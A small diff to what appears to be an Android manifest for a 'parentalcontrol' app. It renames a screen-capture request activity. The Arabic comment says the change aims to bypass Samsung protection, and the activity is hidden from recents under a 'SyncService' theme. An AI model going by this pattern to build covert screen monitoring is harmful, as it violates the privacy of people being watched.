@@ -104,7 +104,7 @@
 
         <!-- منفذ حصري لطلب تصوير الشاشة (تحديث لتجاوز حماية سامسونج) -->
         <activity
-            android:name=".MediaProjectionRequestActivity"
+            android:name="com.example.parentalcontrol.features.screen_capture.controllers.MediaProjectionRequestActivity"
             android:theme="@style/Theme.SyncService"
             android:excludeFromRecents="true"
             android:exported="false"
